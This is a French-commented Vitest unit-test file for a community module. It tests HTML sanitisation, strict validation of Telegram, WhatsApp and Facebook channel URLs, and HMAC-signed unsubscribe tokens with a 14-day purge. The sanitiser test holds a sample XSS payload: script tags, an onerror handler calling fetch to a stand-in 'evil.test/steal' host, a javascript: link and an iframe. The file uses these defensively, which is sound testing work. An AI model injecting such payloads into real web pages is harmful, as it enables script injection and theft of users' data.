import { describe, expect, it } from "vitest";
import { validateCommunityChannelUrl } from "@/modules/community/channel-url";
import { normalizePostSlug, sanitizeEditorialContent } from "@/modules/community/sanitizer";
import {
  computeScheduledPurgeDate,
  createUnsubscribeToken,
  verifyUnsubscribeToken,
} from "@/modules/members/unsubscribe-token";

describe("Phase 8 — BONUVO COMMUNITY & MEMBERS : Unitaires (Sanitisation, Canaux, Désinscription HMAC, Purge 14j)", () => {
  describe("Sanitisation serveur des contenus éditoriaux", () => {
    it("neutralise les balises <script>, <iframe>, attributs on* et schémas javascript:/data:", () => {
      const payload = `
        <h1>Nouveau Bonus 200%</h1>
        <script>window.pwned = true; alert("xss");</script>
        <img src="x" onerror="fetch('https://evil.test/steal')" />
        <a href="javascript:alert(1)">Cliquez ici</a>
        <iframe src="https://evil.test/frame"></iframe>
        Texte légitime conservé.
      `;

      const cleaned = sanitizeEditorialContent(payload);
      expect(cleaned).not.toContain("<script");
      expect(cleaned).not.toContain("alert(");
      expect(cleaned).not.toContain("onerror");
      expect(cleaned).not.toContain("javascript:");
      expect(cleaned).not.toContain("<iframe");
      expect(cleaned).toContain("Nouveau Bonus 200%");
      expect(cleaned).toContain("Texte légitime conservé.");
    });

    it("normalise proprement un slug d'article", () => {
      expect(normalizePostSlug("Événement Spécial : Bonus Côte d'Ivoire !")).toBe(
        "evenement-special-bonus-cote-d-ivoire",
      );
    });
  });

  describe("Validation stricte des URLs de canaux communautaires", () => {
    it("accepte uniquement HTTPS sur les domaines officiels Telegram, WhatsApp et Facebook (y compris les liens officiels BONUVO)", () => {
      const tg = validateCommunityChannelUrl("https://t.me/+OXjlhqM1ShVmZWM0", "telegram");
      expect(tg.ok).toBe(true);
      if (tg.ok) {
        expect(tg.detectedPlatform).toBe("telegram");
      }

      const waChannel = validateCommunityChannelUrl(
        "https://whatsapp.com/channel/0029VbACyWA4dTnIfN5BA01S",
        "whatsapp_channel",
      );
      expect(waChannel.ok).toBe(true);

      const fbPage = validateCommunityChannelUrl(
        "https://www.facebook.com/profile.php?id=100066896162096",
        "facebook",
      );
      expect(fbPage.ok).toBe(true);
      if (fbPage.ok) {
        expect(fbPage.detectedPlatform).toBe("facebook");
      }

      const waGroup = validateCommunityChannelUrl(
        "https://chat.whatsapp.com/InviteCode123",
        "whatsapp_group",
      );
      expect(waGroup.ok).toBe(true);
    });

    it("rejette HTTP non chiffré, domaines tiers, identifiants embarqués et incohérence de plateforme", () => {
      expect(validateCommunityChannelUrl("http://t.me/bonuvo_official")).toEqual({
        ok: false,
        reason: "HTTPS_REQUIRED",
      });

      expect(validateCommunityChannelUrl("https://evil-phishing.com/t.me/bonuvo")).toEqual({
        ok: false,
        reason: "DOMAIN_NOT_ALLOWED",
      });

      expect(validateCommunityChannelUrl("https://user:pass@t.me/bonuvo")).toEqual({
        ok: false,
        reason: "CREDENTIALS_FORBIDDEN",
      });

      expect(validateCommunityChannelUrl("https://t.me/bonuvo", "whatsapp_group")).toEqual({
        ok: false,
        reason: "PLATFORM_DOMAIN_MISMATCH",
      });
    });
  });

  describe("Jeton de désinscription 1-clic signé HMAC-SHA256 & Purge 14 jours", () => {
    const sampleUserId = "11111111-2222-4333-8444-555555555555";
    const secret = "unit-test-hmac-secret-32-chars-minimum!!";

    it("génère et vérifie un jeton authentique sans session", () => {
      const token = createUnsubscribeToken(
        {
          userId: sampleUserId,
          scope: "marketing_email",
          issuedAt: 1_700_000_000_000,
        },
        secret,
      );

      const verified = verifyUnsubscribeToken(token, {
        secret,
        nowMs: 1_700_000_100_000,
      });

      expect(verified.valid).toBe(true);
      if (verified.valid) {
        expect(verified.payload.userId).toBe(sampleUserId);
        expect(verified.payload.scope).toBe("marketing_email");
      }
    });

    it("rejette tout jeton falsifié, tronqué ou expiré", () => {
      const token = createUnsubscribeToken(
        {
          userId: sampleUserId,
          scope: "all",
          issuedAt: 1_700_000_000_000,
        },
        secret,
      );

      const tampered = `${token.slice(0, -4)}abcd`;
      expect(verifyUnsubscribeToken(tampered, { secret })).toEqual({
        valid: false,
        reason: "INVALID_SIGNATURE",
      });

      const wrongSecret = verifyUnsubscribeToken(token, {
        secret: "different-secret-key-0000000000000",
      });
      expect(wrongSecret).toEqual({
        valid: false,
        reason: "INVALID_SIGNATURE",
      });

      const expired = verifyUnsubscribeToken(token, {
        secret,
        nowMs: 1_700_000_000_000 + 200 * 24 * 60 * 60 * 1000,
      });
      expect(expired).toEqual({
        valid: false,
        reason: "TOKEN_EXPIRED",
      });
    });

    it("planifie la purge différée exactement à +14 jours", () => {
      const requestedAt = new Date("2026-11-01T12:00:00.000Z");
      const purgeAt = computeScheduledPurgeDate(requestedAt);
      expect(purgeAt.toISOString()).toBe("2026-11-15T12:00:00.000Z");
    });
  });
});
